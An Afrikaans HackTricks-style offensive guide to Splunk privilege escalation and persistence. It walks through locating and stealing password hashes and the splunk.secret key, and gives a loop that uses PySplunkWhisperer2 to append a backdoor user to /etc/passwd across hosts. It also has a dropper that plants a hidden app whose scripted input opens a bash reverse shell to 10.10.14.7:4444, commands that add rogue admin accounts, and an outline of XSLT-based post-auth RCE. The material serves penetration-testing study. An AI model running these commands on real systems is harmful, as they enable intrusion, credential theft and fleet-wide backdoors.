# Splunk LPE en Persistence

{{#include ../../banners/hacktricks-training.md}}

As jy **intern** of **ekstern** ’n masjien **enumerate** en vind dat **Splunk loop** (gewoonlik **8000** vir die web-UI en **8089** vir die management API), kan geldige credentials dikwels deur app installation, scripted inputs of management actions in **code execution** omskep word. As Splunk as **root** loop, lei dit dikwels onmiddellik tot **privilege escalation**.

As jy slegs die generiese remote attack surface, enumeration of app-upload RCE path benodig, kyk na:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

As jy **reeds root** is en die Splunk-diens nie slegs op localhost luister nie, kan jy ook **Splunk password hashes** steel, **encrypted secrets** herstel of ’n **malicious app** installeer om persistence plaaslik of oor verskeie forwarders te behou.

## Interessante Plaaslike Lêers

Wanneer jy op ’n host met Splunk of Splunk Universal Forwarder beland, is hierdie gewoonlik die interessantste paths:
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Belangrike artefakte:

- **`$SPLUNK_HOME/etc/passwd`**: plaaslike Splunk-gebruikers en wagwoord-hashes.
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: sleutel wat deur Splunk gebruik word om secrets wat in verskeie `.conf`-lêers gestoor word, te enkripteer.
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: aanvanklike admin-bootstrap-lêer; nuttig in gold images en provisioning-foute. Dit word geïgnoreer indien `etc/passwd` reeds bestaan.
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: waar scripted inputs gewoonlik geaktiveer word.
- **`$SPLUNK_HOME/etc/deployment-apps/`** of **`$SPLUNK_HOME/etc/apps/`**: goeie plekke om ’n persistente app weg te steek of te hersien wat reeds versprei word.

## Splunk Universal Forwarder Agent Exploit Summary

Vir verdere besonderhede, kyk na [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Dit is slegs ’n opsomming:

**Exploit-oorsig:**
’n Exploit wat die Splunk Universal Forwarder (UF) teiken, stel attackers met die **agent password** in staat om arbitrêre code uit te voer op stelsels waarop die agent loop, wat moontlik ’n groot deel van die omgewing kan kompromitteer.

**Waarom dit werk:**

- Die UF-management service word gewoonlik op **TCP 8089** blootgestel.
- Attackers kan by die API authenticate en die forwarder opdrag gee om ’n **malicious app bundle** te installeer.
- Dieselfde primitive kan plaaslik vir **LPE** of op afstand vir **RCE** gebruik word.
- Public tooling soos **SplunkWhisperer2** skep die app bundle outomaties en kan payloads vir Linux-targets aanpas.

**Algemene maniere om die password te recover:**

- Cleartext credentials in documentation, scripts, shares of deployment automation.
- Password hashes binne `$SPLUNK_HOME/etc/passwd`, gevolg deur offline cracking.
- Golden images of provisioning leftovers soos `user-seed.conf`.

**Impak:**

- SYSTEM/root-level code execution op elke compromised host.
- Deployment van persistente apps, backdoors of ransomware.
- Deaktivering van of tampering met telemetry voordat die data aangestuur word.

**Example command for exploitation:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Bruikbare publieke exploits:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistence via Scripted Inputs or Malicious Apps

As jy **filesystem write access** as `root`/`splunk`, of authenticated access het om apps te installeer, is ’n baie betroubare persistence-meganisme om ’n **custom app** met ’n **scripted input** te plaas. Splunk se eie documentation verwag dat scripted inputs binne ’n app-directory moet wees en vanuit `inputs.conf` enabled moet word.

Tipiese uitleg:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
Minimale `inputs.conf`:
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Vinnige Linux dropper:
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Notas:

- Dieselfde trick werk op **Universal Forwarder** met `/opt/splunkforwarder/etc/apps/`.
- Attackers blend dikwels in deur ’n legitimate add-on te wysig in plaas daarvan om ’n ooglopend malicious app te skep.
- Op ’n **deployment server** verander die plant van ’n malicious app binne `deployment-apps/` in **fleet-wide persistence**, omdat forwarders vir updated apps poll, dit aflaai en dikwels herstart om dit toe te pas.

## Credential Theft en Admin Takeover

As jy Splunk se local files kan lees, is daar gewoonlik twee goeie doelwitte: herstel **Splunk admin access** en herstel **encrypted service credentials**.

### Password hashes en local users

Splunk stoor local authentication data in `etc/passwd`. Afhangend van die deployment, kan cracking van daardie file werkende credentials vir die web UI en die management API herstel.

As jy reeds geldige **admin** credentials het en Splunk die **native** authentication backend gebruik, kan die CLI self vir persistence gebruik word:
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` en encrypted values

Splunk gebruik `etc/auth/splunk.secret` om sensitiewe waardes te beskerm wat in verskeie konfigurasielêers gestoor word. As jy beide die **secret** en die relevante **`.conf`-lêers** kan steel, kan jy dikwels die volgende herwin of hergebruik:

- forwarder/indexer shared secrets soos `pass4SymmKey`
- TLS private-key passwords soos `sslPassword`
- LDAP bind credentials soos `bindDNPassword`

Dit is nuttig vir **lateral movement**, selfs wanneer die Splunk admin password self nie crackbaar is nie.

### Misbruik van `user-seed.conf`

`user-seed.conf` word slegs tydens die eerste start gebruik, of wanneer `etc/passwd` nie bestaan nie. Dit maak dit minder nuttig op ’n aktiewe stelsel, maar baie interessant in:

- gekompromitteerde installasietemplates
- container images
- unattended provisioning workflows
- appliances waar Splunk outomaties herinitialiseer word

In sulke gevalle gee die plasing van ’n `HASHED_PASSWORD` wat met `splunk hash-passwd` gegenereer is, jou ’n stil manier om admin access ná redeployment te herwin.

## Misbruik van Splunk Queries

Vir verdere besonderhede, kyk na [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).

’n Nuttige onlangse tegniek is die misbruik van **user-supplied XSLT** in kwesbare Splunk Enterprise-weergawes om ’n low-privileged authenticated account in **OS command execution** as die `splunk`-user te omskep.

Hoëvlak-vloei:

1. Authenticate by Splunk.
2. Upload ’n malicious **XSL**-lêer deur die preview/upload-functionality.
3. Laat Splunk search results render met daardie uploaded stylesheet vanuit die **dispatch**-directory.
4. Gebruik die XSLT-payload om ’n lêer te skryf of execution deur Splunk se search pipeline te trigger, byvoorbeeld deur interne functionality soos `runshellscript` te bereik.

Die belangrikste offensive takeaway is dat hierdie pad **post-auth RCE sonder app upload** is. Op Linux beland jy gewoonlik in die **`splunk`**-account, wat steeds waardevol is omdat daardie user dikwels die application tree besit, secrets kan lees en persistent apps kan plant wat shell loss oorleef.

’n Verteenwoordigende path wat tydens exploitation gebruik word, is:
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
As Splunk met te veel voorregte loop, of as die `splunk`-gebruiker toegang het tot gevaarlike scripts, skryfbare diens-eenhede of swak `sudo`-reëls, word dit ’n skoon **LPE**-ketting.

## Verwysings

- [https://advisory.splunk.com/advisories/SVD-2023-1104](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
{{#include ../../banners/hacktricks-training.md}}
